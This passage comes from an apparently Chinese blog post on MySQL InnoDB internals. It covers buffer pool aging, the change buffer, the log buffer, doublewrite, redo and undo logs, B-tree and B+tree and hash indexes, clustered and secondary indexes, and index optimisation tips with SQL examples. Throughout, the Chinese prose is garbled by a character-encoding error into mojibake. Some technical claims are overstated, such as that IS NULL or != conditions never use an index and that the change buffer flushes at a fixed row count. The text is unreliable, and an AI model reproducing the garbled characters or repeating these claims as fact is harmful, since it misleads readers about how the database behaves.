æ—¶ï¼Œé¦–å…ˆæ’å…¥ä¸­ç‚¹</li><li>è®¿é—®æ—§å­åˆ—è¡¨ä¸­çš„é¡µé¢ä¼šä½¿å¾—å…¶å˜ä¸ºâ€å¹´è½»â€œï¼Œç„¶åç§»è‡³æ–°å­åˆ—è¡¨çš„å¼€å¤´</li><li>éšç€æ•°æ®åº“çš„è¿è¡Œï¼Œé€šè¿‡ç§»è‡³åˆ—è¡¨çš„æœ«å°¾ï¼Œç¼“å†²æ± ä¸­æœªè®¿é—®çš„é¡µé¢å°†â€œè€åŒ–â€ï¼Œæ–°çš„å’Œæ—§çš„å­åˆ—è¡¨ä¸­çš„é¡µé¢éƒ½ä¼šéšç€å…¶ä»–é¡µé¢çš„æ›´æ–°è€Œè€åŒ–ï¼Œéšç€åœ¨ä¸­ç‚¹æ’å…¥é¡µé¢ï¼Œæ—§å­åˆ—è¡¨ä¸­çš„é¡µé¢ä¹Ÿä¼šè€åŒ–ã€‚æœ€ç»ˆï¼Œæœªä½¿ç”¨çš„é¡µé¢åˆ°è¾¾æ—§å­åˆ—è¡¨çš„å°¾éƒ¨å¹¶è¢«é€å‡ºã€‚</li></ul><h4 id="Change-Buffer"><a href="#Change-Buffer" class="headerlink" title="Change Buffer"></a>Change Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-change-buffer.html">æ’å…¥ç¼“å†²</a></p><p>æ’å…¥ç¼“å†²é’ˆå¯¹çš„æ“ä½œæ˜¯æ›´æ–°æˆ–è€…æ’å…¥ï¼Œæˆ‘ä»¬è€ƒè™‘æœ€åçš„æƒ…å†µï¼Œé‚£å°±æ˜¯éœ€è¦æ›´æ–°çš„æ•°æ®éƒ½ä¸åœ¨ç¼“å†²æ± ä¸­ã€‚é‚£ä¹ˆæ­¤æ—¶ç­‰æ•°æ®è¾¾åˆ°æŸä¸ªé˜ˆå€¼ï¼ˆä¾‹å¦‚50æ¡ï¼‰æ‰æ‰¹é‡çš„å†™å…¥ç£ç›˜</p><p><img src="https://dev.mysql.com/doc/refman/8.0/en/images/innodb-change-buffer.png" alt loading="lazy"></p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_change_buffering"><code>innodb_change_buffering</code></a> å˜é‡æ§åˆ¶<code>InnoDB</code> æ‰§è¡Œæ›´æ”¹ç¼“å†²çš„ç¨‹åº¦ï¼Œé»˜è®¤å€¼ä¸ºallã€‚</p><ul><li><p><strong><code>all</code></strong></p><p>é»˜è®¤å€¼ï¼šç¼“å†²åŒºæ’å…¥ï¼Œåˆ é™¤æ ‡è®°æ“ä½œå’Œæ¸…é™¤ã€‚</p></li><li><p><strong><code>none</code></strong></p><p>ä¸è¦ç¼“å†²ä»»ä½•æ“ä½œã€‚</p></li><li><p><strong><code>inserts</code></strong></p><p>ç¼“å†²åŒºæ’å…¥æ“ä½œã€‚</p></li><li><p><strong><code>deletes</code></strong></p><p>ç¼“å†²åŒºåˆ é™¤æ ‡è®°æ“ä½œã€‚</p></li><li><p><strong><code>changes</code></strong></p><p>ç¼“å†²æ’å…¥å’Œåˆ é™¤æ ‡è®°æ“ä½œã€‚</p></li><li><p><strong><code>purges</code></strong></p><p>ç¼“å†²åœ¨åå°å‘ç”Ÿçš„ç‰©ç†åˆ é™¤æ“ä½œã€‚</p></li></ul><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_change_buffer_max_size"><code>innodb_change_buffer_max_size</code></a> å˜é‡å…è®¸å°†æ›´æ”¹ç¼“å†²åŒºçš„æœ€å¤§å¤§å°é…ç½®ä¸ºç¼“å†²æ± æ€»å¤§å°çš„ç™¾åˆ†æ¯”ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ <code>innodb_change_buffer_max_size</code>è®¾ç½®ä¸º25ã€‚æœ€å¤§è®¾ç½®ä¸º50ã€‚</p><h4 id="Log-Buffer"><a href="#Log-Buffer" class="headerlink" title="Log Buffer"></a>Log Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-redo-log-buffer.html">æ—¥å¿—ç¼“å†²</a></p><p>æ—¥å¿—ç¼“å†²åŒºæ˜¯å­˜å‚¨åŒºåŸŸï¼Œç”¨äºä¿å­˜è¦å†™å…¥ç£ç›˜ä¸Šçš„æ—¥å¿—æ–‡ä»¶çš„æ•°æ®ã€‚æ—¥å¿—ç¼“å†²åŒºå¤§å°ç”±<a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_log_buffer_size"><code>innodb_log_buffer_size</code></a>å˜é‡å®šä¹‰ ã€‚é»˜è®¤å¤§å°ä¸º16MBã€‚æ—¥å¿—ç¼“å†²åŒºçš„å†…å®¹ä¼šå®šæœŸåˆ·æ–°åˆ°ç£ç›˜ã€‚è¾ƒå¤§çš„æ—¥å¿—ç¼“å†²åŒºä½¿å¤§å‹äº‹åŠ¡å¯ä»¥è¿è¡Œï¼Œè€Œæ— éœ€åœ¨äº‹åŠ¡æäº¤ä¹‹å‰å°†é‡åšæ—¥å¿—æ•°æ®å†™å…¥ç£ç›˜ã€‚å› æ­¤ï¼Œå¦‚æœæœ‰æ›´æ–°ï¼Œæ’å…¥æˆ–åˆ é™¤è®¸å¤šè¡Œçš„äº‹åŠ¡ï¼Œåˆ™å¢åŠ æ—¥å¿—ç¼“å†²åŒºçš„å¤§å°å¯ä»¥èŠ‚çœç£ç›˜I/Oã€‚</p><h4 id="Adaptive-Hash-Index"><a href="#Adaptive-Hash-Index" class="headerlink" title="Adaptive Hash Index"></a>Adaptive Hash Index</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-adaptive-hash.html">è‡ªé€‚åº”å“ˆå¸Œç´¢å¼•</a></p><p>è‡ªé€‚åº”ç´¢å¼•å°±è·ŸJVMåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œä¼šåŠ¨æ€çš„æŠŠæŸäº›çƒ­ç‚¹ä»£ç ç¼–è¯‘æˆMachine Codeä¸€æ ·ï¼ŒInnoDBä¼šç›‘æ§å¯¹æ‰€æœ‰ç´¢å¼•çš„æŸ¥è¯¢ï¼Œå¯¹çƒ­ç‚¹è®¿é—®çš„é¡µå»ºç«‹å“ˆå¸Œç´¢å¼•ï¼Œä»¥æ­¤æ¥æå‡è®¿é—®é€Ÿåº¦ã€‚</p><h4 id="Doublewrite-Buffer"><a href="#Doublewrite-Buffer" class="headerlink" title="Doublewrite Buffer"></a>Doublewrite Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-doublewrite-buffer.html">åŒå†™ç¼“å†²åŒº</a></p><p><strong>æ’å…¥ç¼“å†²</strong>æé«˜äº†MySQLçš„æ€§èƒ½ï¼Œè€Œ<strong>ä¸¤æ¬¡å†™</strong>åˆ™åœ¨æ­¤åŸºç¡€ä¸Šæé«˜äº†æ•°æ®çš„å¯é æ€§ã€‚å½“æ•°æ®è¿˜åœ¨ç¼“å†²æ± ä¸­çš„æ—¶å€™ï¼Œå½“æœºå™¨å®•æœºäº†ï¼Œå‘ç”Ÿäº†<strong>å†™å¤±æ•ˆ</strong>ï¼Œæœ‰Redo Logæ¥è¿›è¡Œæ¢å¤ã€‚ä½†æ˜¯å¦‚æœæ˜¯åœ¨ä»ç¼“å†²æ± ä¸­å°†æ•°æ®åˆ·å›ç£ç›˜çš„æ—¶å€™å®•æœºäº†å‘¢ï¼Ÿ</p><p>è¿™ç§æƒ…å†µå«åšéƒ¨åˆ†å†™å¤±æ•ˆï¼Œæ­¤æ—¶é‡åšæ—¥å¿—å°±æ— æ³•è§£å†³é—®é¢˜ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409163524052.png" alt loading="lazy"></p><p>åœ¨åˆ·è„é¡µæ—¶ï¼Œå¹¶ä¸æ˜¯ç›´æ¥åˆ·å…¥ç£ç›˜ï¼Œè€Œæ˜¯copyåˆ°å†…å­˜ä¸­çš„Doublewrite Bufferä¸­ï¼Œç„¶åå†æ‹·è´è‡³ç£ç›˜å…±äº«è¡¨ç©ºé—´ï¼ˆä½ å¯ä»¥å°±ç†è§£ä¸ºç£ç›˜ï¼‰ä¸­ï¼Œæ¯æ¬¡å†™å…¥1Mï¼Œç­‰copyå®Œæˆåï¼Œå†å°†Doublewrite Bufferä¸­çš„é¡µå†™å…¥ç£ç›˜æ–‡ä»¶ã€‚</p><p>æœ‰äº†ä¸¤æ¬¡å†™æœºåˆ¶ï¼Œå³ä½¿åœ¨åˆ·è„é¡µæ—¶å®•æœºäº†ï¼Œåœ¨å®ä¾‹æ¢å¤çš„æ—¶å€™ä¹Ÿå¯ä»¥ä»å…±äº«è¡¨ç©ºé—´ä¸­æ‰¾åˆ°Doublewrite Bufferçš„é¡µå‰¯æœ¬ï¼Œç›´æ¥å°†å…¶è¦†ç›–åŸæ¥çš„æ•°æ®é¡µå³å¯ã€‚</p><p>å°½ç®¡æ•°æ®è¢«å†™å…¥ä¸¤æ¬¡ï¼Œä½†åŒå†™ç¼“å†²åŒºä¸éœ€è¦ä¸¤å€çš„I / Oå¼€é”€æˆ–ä¸¤å€çš„I / Oæ“ä½œã€‚åªéœ€ä¸€æ¬¡<code>fsync()</code>è°ƒç”¨æ“ä½œç³»ç»Ÿå³å¯å°†æ•°æ®æŒ‰è¾ƒå¤§çš„é¡ºåºå—å†™å…¥doublewriteç¼“å†²åŒºï¼ˆé™¤é <code>innodb_flush_method</code>è®¾ç½®ä¸º <code>O_DIRECT_NO_FSYNC</code>ï¼‰ã€‚</p><p>åœ¨MySQL 8.0.20ä¹‹å‰ï¼Œdoublewriteç¼“å†²åŒºå­˜å‚¨åŒºä½äº<code>InnoDB</code>ç³»ç»Ÿè¡¨ç©ºé—´ä¸­ã€‚ä»MySQL 8.0.20å¼€å§‹ï¼Œdoublewriteç¼“å†²åŒºå­˜å‚¨åŒºä½äºdoublewriteæ–‡ä»¶ä¸­ã€‚</p><h4 id="Redo-Log"><a href="#Redo-Log" class="headerlink" title="Redo Log"></a>Redo Log</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-redo-log.html">é‡åšæ—¥å¿—</a></p><p>ç”¨äºè®°å½•äº‹åŠ¡æ“ä½œçš„å˜åŒ–ï¼Œä¸”è®°å½•çš„æ˜¯ä¿®æ”¹ä¹‹åçš„å€¼ã€‚</p><p>ä¸ç®¡äº‹åŠ¡æ˜¯å¦æäº¤éƒ½ä¼šè®°å½•ä¸‹æ¥ã€‚ä¾‹å¦‚åœ¨æ›´æ–°æ•°æ®æ—¶ï¼Œä¼šå…ˆå°†æ›´æ–°çš„è®°å½•å†™åˆ°Redo Logä¸­ï¼Œå†æ›´æ–°ç¼“å­˜ä¸­é¡µä¸­çš„æ•°æ®ã€‚ç„¶åæŒ‰ç…§è®¾ç½®çš„æ›´æ–°ç­–ç•¥ï¼Œå°†å†…å­˜ä¸­çš„æ•°æ®åˆ·å›ç£ç›˜ã€‚</p><h4 id="Undo-Log"><a href="#Undo-Log" class="headerlink" title="Undo Log"></a>Undo Log</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-undo-logs.html">æ’¤æ¶ˆæ—¥å¿—</a></p><p>è®°å½•äº‹åŠ¡å¼€å§‹ä¹‹å‰çš„ä¸€ä¸ªç‰ˆæœ¬ï¼Œå¯ç”¨äºäº‹åŠ¡å¤±è´¥ä¹‹åå‘ç”Ÿçš„å›æ»šã€‚</p><h3 id="ç´¢å¼•"><a href="#ç´¢å¼•" class="headerlink" title="ç´¢å¼•"></a>ç´¢å¼•</h3><p>MySQLç´¢å¼•çš„å»ºç«‹å¯¹äºMySQLçš„é«˜æ•ˆè¿è¡Œæ˜¯å¾ˆé‡è¦çš„ï¼Œç´¢å¼•å¯ä»¥å¤§å¤§æé«˜MySQLçš„æ£€ç´¢é€Ÿåº¦ã€‚</p><p>æ‹¿æ±‰è¯­å­—å…¸çš„ç›®å½•é¡µï¼ˆç´¢å¼•ï¼‰æ‰“æ¯”æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰æ‹¼éŸ³ã€ç¬”ç”»ã€åæ—éƒ¨é¦–ç­‰æ’åºçš„ç›®å½•ï¼ˆç´¢å¼•ï¼‰å¿«é€ŸæŸ¥æ‰¾åˆ°éœ€è¦çš„å­—ã€‚</p><p>åˆ›å»ºç´¢å¼•æ—¶ï¼Œä½ éœ€è¦ç¡®ä¿è¯¥ç´¢å¼•æ˜¯åº”ç”¨åœ¨ SQL æŸ¥è¯¢è¯­å¥çš„æ¡ä»¶(ä¸€èˆ¬ä½œä¸º WHERE å­å¥çš„æ¡ä»¶)ã€‚</p><p>å®é™…ä¸Šï¼Œç´¢å¼•ä¹Ÿæ˜¯ä¸€å¼ è¡¨ï¼Œè¯¥è¡¨ä¿å­˜äº†ä¸»é”®ä¸ç´¢å¼•å­—æ®µï¼Œå¹¶æŒ‡å‘å®ä½“è¡¨çš„è®°å½•ã€‚</p><p>è¿‡å¤šçš„ä½¿ç”¨ç´¢å¼•å°†ä¼šé€ æˆæ»¥ç”¨ã€‚å› æ­¤ç´¢å¼•ä¹Ÿä¼šæœ‰å®ƒçš„ç¼ºç‚¹ï¼šè™½ç„¶ç´¢å¼•å¤§å¤§æé«˜äº†æŸ¥è¯¢é€Ÿåº¦ï¼ŒåŒæ—¶å´ä¼šé™ä½æ›´æ–°è¡¨çš„é€Ÿåº¦ï¼Œå¦‚å¯¹è¡¨è¿›è¡ŒINSERTã€UPDATEå’ŒDELETEã€‚å› ä¸ºæ›´æ–°è¡¨æ—¶ï¼ŒMySQLä¸ä»…è¦ä¿å­˜æ•°æ®ï¼Œè¿˜è¦ä¿å­˜ä¸€ä¸‹ç´¢å¼•æ–‡ä»¶ã€‚å»ºç«‹ç´¢å¼•ä¼šå ç”¨ç£ç›˜ç©ºé—´çš„ç´¢å¼•æ–‡ä»¶ã€‚</p><p>ç´¢å¼•åˆ†ä¸ºï¼š</p><ol><li><p>ä¸»é”®ç´¢å¼•</p><p>primary key() è¦æ±‚å…³é”®å­—ä¸èƒ½é‡å¤ï¼Œä¹Ÿä¸èƒ½ä¸ºnull,åŒæ—¶å¢åŠ ä¸»é”®çº¦æŸ</p><p>ä¸»é”®ç´¢å¼•å®šä¹‰æ—¶ï¼Œä¸èƒ½å‘½å</p></li><li><p>å”¯ä¸€ç´¢å¼•</p><p>unique index() è¦æ±‚å…³é”®å­—ä¸èƒ½é‡å¤ï¼ŒåŒæ—¶å¢åŠ å”¯ä¸€çº¦æŸ</p></li><li><p>æ™®é€šç´¢å¼•</p><p>index() å¯¹å…³é”®å­—æ²¡æœ‰è¦æ±‚</p></li><li><p>å…¨æ–‡ç´¢å¼•</p><p>fulltext key() å…³é”®å­—çš„æ¥æºä¸æ˜¯æ‰€æœ‰å­—æ®µçš„æ•°æ®ï¼Œè€Œæ˜¯å­—æ®µä¸­æå–çš„ç‰¹åˆ«å…³é”®å­—</p></li></ol><p>å…ˆäº†è§£ä¸€ä¸‹ç´¢å¼•çš„æ•°æ®ç»“æ„ B-Treeï¼ˆMySQLä¸»è¦ä½¿ç”¨ B-tree å¹³è¡¡æ ‘ï¼‰</p><h4 id="Bæ ‘"><a href="#Bæ ‘" class="headerlink" title="Bæ ‘"></a>Bæ ‘</h4><p>Bæ ‘ä¹Ÿç§°B-æ ‘,å®ƒæ˜¯ä¸€é¢—å¤šè·¯å¹³è¡¡æŸ¥æ‰¾æ ‘ã€‚å¤§è‡´ç»“æ„å¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410153354423.png" alt loading="lazy"></p><p>Bæ ‘çš„é˜¶ä¸ºèŠ‚ç‚¹çš„æœ€å¤šçš„å­èŠ‚ç‚¹æ•°</p><p>Bæ•°çš„æœç´¢æ–¹å¼ä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œå¯¹èŠ‚ç‚¹å†…çš„å…³é”®å­—ï¼ˆæœ‰åºï¼‰åºåˆ—è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾ï¼Œå¦‚æœå‘½ä¸­åˆ™ç»“æŸï¼Œå¦åˆ™è¿›å…¥æŸ¥è¯¢å…³é”®å­—æ‰€å±èŒƒå›´çš„å„¿å­èŠ‚ç‚¹ï¼Œå¶å­èŠ‚ç‚¹å’Œéå¶å­èŠ‚ç‚¹éƒ½å­˜æ”¾æ•°æ®ï¼Œæœç´¢æœ‰å¯èƒ½åœ¨éå¶å­èŠ‚ç‚¹ç»“æŸã€‚</p><h4 id="B-æ ‘"><a href="#B-æ ‘" class="headerlink" title="B+æ ‘"></a>B+æ ‘</h4><p>B+ æ ‘æ˜¯ B æ ‘çš„å˜ä½“ï¼Œä¹Ÿæ˜¯ä¸€ç§å¤šè·¯æœç´¢æ ‘ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410154531450.png" alt loading="lazy"></p><p>B+æ ‘åªæœ‰åˆ°è¾¾å¶å­èŠ‚ç‚¹æ‰å‘½ä¸­ï¼Œå³æ‰€æœ‰å…³é”®å­—éƒ½å‡ºç°åœ¨å¶å­èŠ‚ç‚¹é“¾è¡¨ä¸­</p><ul><li>æ•°æ®åªèƒ½åœ¨å¶å­èŠ‚ç‚¹ï¼Œä¹Ÿå« <strong>ç¨ å¯†ç´¢å¼•</strong>ï¼Œä¸”é“¾è¡¨ä¸­çš„å…³é”®å­—ï¼ˆæ•°æ®ï¼‰æ°å¥½æ˜¯æœ‰åºçš„ã€‚</li></ul><p>éå¶å­èŠ‚ç‚¹ç›¸å½“äºæ˜¯å¶å­èŠ‚ç‚¹çš„ç´¢å¼•ï¼Œä¹Ÿå« <strong>ç¨€ç–ç´¢å¼•</strong>ï¼Œå¶å­èŠ‚ç‚¹ç›¸å½“äºæ˜¯å­˜å‚¨ï¼ˆå…³é”®å­—ï¼‰æ•°æ®çš„æ•°æ®å±‚</p><p>B+æ•°å¯¹äºBæ•°çš„ä¼˜åŠ¿</p><ul><li>å•ä¸€èŠ‚ç‚¹å­˜å‚¨çš„å…ƒç´ å¤šï¼Œä½¿å¾—æŸ¥è¯¢çš„IOæ¬¡æ•°æ›´å°‘ï¼Œé€‚åˆåšMySQLçš„åº•å±‚æ•°æ®ç»“æ„</li><li>æ‰€æœ‰æŸ¥è¯¢éƒ½è¦æŸ¥åˆ°å¶å­èŠ‚ç‚¹ï¼ŒæŸ¥è¯¢æ€§èƒ½ç¨³å®š</li><li>æ‰€æœ‰å¶å­èŠ‚ç‚¹å½¢æˆä¸€ä¸ªæœ‰åºçš„é“¾è¡¨ï¼Œä¾¿äºæŸ¥æ‰¾</li></ul><h4 id="å“ˆå¸Œç´¢å¼•"><a href="#å“ˆå¸Œç´¢å¼•" class="headerlink" title="å“ˆå¸Œç´¢å¼•"></a>å“ˆå¸Œç´¢å¼•</h4><p>åªæœ‰ç²¾ç¡®åŒ¹é…ç´¢å¼•æ‰€æœ‰åˆ—çš„æŸ¥è¯¢æ‰æœ‰æ•ˆã€‚æ¯è¡Œæ•°æ®å­˜å‚¨å¼•æ“éƒ½ä¼šå¯¹æ‰€æœ‰çš„ç´¢å¼•åˆ—è®¡ç®—ä¸€ä¸ªå“ˆå¸Œç ï¼Œå“ˆå¸Œç´¢å¼•å°†å“ˆå¸Œç å­˜å‚¨åœ¨ç´¢å¼•ä¸­ï¼ŒåŒæ—¶åœ¨å“ˆå¸Œè¡¨ä¸­ä¿å­˜æŒ‡å‘æ¯ä¸ªæ•°æ®è¡Œçš„æŒ‡é’ˆã€‚å› ä¸ºç´¢å¼•è‡ªèº«åªå­˜å‚¨å¯¹åº”çš„å“ˆå¸Œå€¼ï¼Œæ‰€ä»¥ç´¢å¼•çš„ç»“æ„ååˆ†ç´§å‡‘ï¼Œå“ˆå¸Œç´¢å¼•æŸ¥æ‰¾çš„é€Ÿåº¦éå¸¸å¿«ã€‚ä½†æ˜¯</p><ul><li>ä¸æŒ‰ç…§ç´¢å¼•é¡ºåºå­˜å‚¨ï¼Œæ— æ³•ç”¨äºæ’åº</li><li>ä¸æ”¯æŒéƒ¨åˆ†ç´¢å¼•æŸ¥æ‰¾åŒ¹é…</li><li>ä¸æ”¯æŒèŒƒå›´æŸ¥æ‰¾</li></ul><h4 id="èšé›†ç´¢å¼•"><a href="#èšé›†ç´¢å¼•" class="headerlink" title="èšé›†ç´¢å¼•"></a>èšé›†ç´¢å¼•</h4><p>ç”±B+æ ‘å®ç°ï¼Œä¸€ä¸ªè¡¨åªèƒ½æœ‰ä¸€ä¸ªèšé›†ç´¢å¼•ï¼ŒInnoDBè¡¨ä¸­èšé›†ç´¢å¼•çš„ç´¢å¼•åˆ—å°±æ˜¯ä¸»é”®ï¼Œæ‰€ä»¥èšé›†ç´¢å¼•ä¹Ÿå«ä¸»é”®ç´¢å¼•ã€‚å¦‚ä¸‹è¡¨ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> Student<span class="token punctuation">(</span>    id <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token keyword">auto_increment</span><span class="token punctuation">,</span>    last_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>     first_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>     birthday <span class="token keyword">date</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>èšé›†ç´¢å¼•çš„ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410161154845.png" alt loading="lazy"></p><blockquote><p>èšç°‡ç´¢å¼•ï¼šç´¢å¼•çš„å¶èŠ‚ç‚¹æŒ‡å‘æ•°æ®</p><p>éèšç°‡ç´¢å¼•ï¼šç´¢å¼•çš„å¶èŠ‚ç‚¹æŒ‡å‘æ•°æ®çš„å¼•ç”¨</p><p>myisamä½¿ç”¨éèšç°‡ç´¢å¼•ï¼Œinnodbä½¿ç”¨èšç°‡ç´¢å¼•</p></blockquote><h4 id="äºŒçº§ç´¢å¼•"><a href="#äºŒçº§ç´¢å¼•" class="headerlink" title="äºŒçº§ç´¢å¼•"></a>äºŒçº§ç´¢å¼•</h4><p>å¯¹äºInnoDBè¡¨ï¼Œåœ¨éä¸»é”®åˆ—çš„å…¶ä»–åˆ—ä¸Šå»ºçš„ç´¢å¼•å°±æ˜¯äºŒçº§ç´¢å¼•ï¼ˆå› ä¸ºèšé›†ç´¢å¼•åªæœ‰ä¸€ä¸ªï¼‰ã€‚</p><p>åœ¨MySQLä¸­ä¸»é”®ç´¢å¼•çš„å¶å­èŠ‚ç‚¹å­˜çš„æ˜¯æ•´è¡Œæ•°æ®ï¼Œè€ŒäºŒçº§ç´¢å¼•å¶å­èŠ‚ç‚¹å†…å®¹æ˜¯ä¸»é”®çš„å€¼ã€‚</p><p>è¯¦è§ï¼š<a href="http://mysql.taobao.org/monthly/2020/01/01/">MySQL Â· å¼•æ“ç‰¹æ€§ Â· äºŒçº§ç´¢å¼•åˆ†æ</a></p><h3 id="ç´¢å¼•ä¼˜åŒ–"><a href="#ç´¢å¼•ä¼˜åŒ–" class="headerlink" title="ç´¢å¼•ä¼˜åŒ–"></a>ç´¢å¼•ä¼˜åŒ–</h3><ul><li><p>å°½é‡ä¿è¯å…¨å€¼åŒ¹é…ï¼Œå³ç´¢å¼•å­—æ®µå’Œselectå­—æ®µç›¸åŒä¸”é¡ºåºä¸€è‡´</p></li><li><p>æœ€ä½³å·¦å‰ç¼€æ³•åˆ™ï¼šå¦‚æœç´¢å¼•å¤šåˆ—ï¼Œåˆ™æŸ¥è¯¢è¦ä»ç´¢å¼•çš„æœ€å·¦åˆ—å¼€å§‹ï¼Œä¸”ä¸­é—´ä¸è·³è¿‡ç´¢å¼•ä¸­çš„åˆ—</p></li><li><p>ä¸åœ¨ç´¢å¼•åˆ—ä¸Šåšä»»ä½•æ“ä½œ(è®¡ç®—ã€å‡½æ•°ã€ç±»å‹è½¬æ¢ã€ä¸è¦å‡ºç°éšå¼è½¬)ï¼Œä¼šå¯¼è‡´ç´¢å¼•å¤±æ•ˆè€Œå…¨è¡¨æ‰«æ</p><pre class="language-sql" data-language="sql"><code class="language-sql">å‡è®¾ç›®æ ‡è¡Œ name <span class="token operator">=</span> <span class="token string">'july'</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> name<span class="token operator">=</span><span class="token string">'july'</span><span class="token punctuation">;</span>           <span class="token comment">## èµ°ç´¢å¼• </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> <span class="token keyword">left</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'july'</span><span class="token punctuation">;</span>   <span class="token comment">## ä¸èµ°ç´¢å¼•</span></code></pre></li><li><p>ä¸€æ—¦å‡ºç°éç­‰å€¼å­—æ®µæ¡ä»¶åˆ¤æ–­ï¼Œåˆ™è¯¥å­—æ®µåçš„ç´¢å¼•åˆ—çš†å¤±æ•ˆ</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b<span class="token operator">=</span><span class="token number">100</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## å…¨ç´¢å¼•  a_b_c  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b<span class="token operator">></span><span class="token number">100</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## éƒ¨åˆ†ç´¢å¼• a_b  </span><span class="token comment">## éç­‰å€¼æ¡ä»¶åŒ…æ‹¬ï¼šin &lt; > != like ç­‰  </span><span class="token comment">## æ³¨æ„ï¼šå½“like 'aaa%' é€šé…ç¬¦åœ¨å³æ—¶ï¼Œä»ç„¶èƒ½å¤Ÿèµ°å…¨ç´¢å¼•  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b <span class="token operator">like</span> <span class="token string">'100%'</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## å…¨ç´¢å¼•  a_b_c  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b <span class="token operator">like</span> <span class="token string">'%100'</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## éƒ¨åˆ†ç´¢å¼• a</span></code></pre></li><li><p>å°½é‡ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼Œå³æŸ¥è¯¢åˆ—ä¸ºç´¢å¼•åˆ—çš„å­é›†ï¼Œå‡å°‘select * çš„ä½¿ç”¨</p></li><li><p>MySQLåœ¨ä½¿ç”¨ä¸ç­‰äº(!=æˆ–è€…&lt;&gt;)æ—¶æ— æ³•ä½¿ç”¨ç´¢å¼•ï¼Œä¼šå¯¼è‡´å…¨è¡¨æ‰«æ</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>     <span class="token comment">## èµ°ç´¢å¼•  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">!=</span><span class="token number">100</span><span class="token punctuation">;</span>    <span class="token comment">## ä¸èµ°ç´¢å¼•ï¼Œå…¨è¡¨æ‰«æ</span></code></pre></li><li><p>æŸ¥è¯¢æ¡ä»¶ä¸º is NULL å’Œ is not NULLæƒ…å†µæ—¶ä¹Ÿæ— æ³•ä½¿ç”¨ç´¢å¼•</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a <span class="token operator">is</span> <span class="token boolean">null</span><span class="token punctuation">;</span>      <span class="token comment">## ä¸èµ°ç´¢å¼•  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a <span class="token operator">is</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">;</span>  <span class="token comment">## ä¸èµ°ç´¢å¼• 